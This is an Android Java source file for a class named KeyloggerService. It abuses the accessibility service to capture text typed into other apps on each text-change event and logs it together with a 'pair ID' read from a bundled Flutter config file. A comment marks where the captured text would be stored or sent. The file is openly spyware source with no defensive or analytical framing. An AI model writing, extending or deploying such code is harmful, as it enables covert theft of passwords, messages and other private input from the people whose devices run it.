package com.nullx.pp;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import org.json.JSONObject;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String pairId = getPairIdFromConfig();
        
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String textData = event.getText().toString();
            Log.d(TAG, "Keylog Terdeteksi untuk Pair ID [" + pairId + "]: " + textData);
            // Logika simpan/kirim keylog menggunakan pairId
        }
    }

    @Override
    public void onInterrupt() {}

    private String getPairIdFromConfig() {
        try {
            InputStream is = getAssets().open("flutter_assets/assets/config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();
            return new JSONObject(new String(buffer, StandardCharsets.UTF_8)).optString("pairId", "UNKNOWN_ID");
        } catch (Exception e) {
            return "UNKNOWN_ID";
        }
    }
}